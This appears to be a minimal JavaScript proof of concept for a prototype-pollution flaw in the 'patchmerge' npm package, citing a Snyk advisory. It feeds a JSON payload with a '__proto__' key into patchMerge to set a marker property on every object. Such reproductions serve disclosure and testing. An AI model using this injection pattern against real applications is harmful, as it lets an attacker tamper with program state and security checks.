//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
const patchMerge = require("patchmerge");

let obj = {};
patchMerge(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));

